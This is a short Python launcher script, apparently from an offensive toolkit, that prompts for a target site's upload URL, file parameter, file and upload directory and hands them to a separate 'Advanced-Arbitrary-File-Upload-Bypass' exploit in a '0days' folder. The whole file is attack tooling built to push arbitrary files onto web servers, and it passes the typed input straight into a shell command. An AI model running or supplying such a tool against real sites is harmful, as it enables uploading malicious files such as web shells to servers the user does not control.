import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


class Exploit(object):
    def __init__(self, url, param_that_accepts_files, file_to_upload, directory_with_file):
        self.param_that_accepts_files = param_that_accepts_files
        self.directory_with_file = directory_with_file
        self.file_to_upload = file_to_upload
        self.url = url

    def send(self):
        sub.call(
            f"python3 ../0days/Advanced-Arbitrary-File-Upload-Bypass.py ASP {self.file_to_upload} {self.directory_with_file} {self.url} {self.param_that_accepts_files}", shell=True)


attack = Exploit(
    url=input(
        f"{Colors.red}(Upload-Death-Bypass-Upload-PERL(POC)){Colors.end} [Enter Complete URL With Uploads Section]:~#"),
    param_that_accepts_files=input(
        f"{Colors.red}(Upload-Death-Bypass-Upload-PERL(POC)){Colors.end} [Enter HTML Parameter That Accepts Files]:~#"),
    file_to_upload=input(
        f"{Colors.red}(Upload-Death-Bypass-Upload-PERL(POC)){Colors.end} [Enter File For Uploading]:~#"),
    directory_with_file=input(
        f"{Colors.red}(Upload-Death-Bypass-Upload-PERL(POC)){Colors.end} [Where Do Files Get Uploaded To? (FULL URL)]:~#"))

if __name__ == "__main__":
    attack.send()
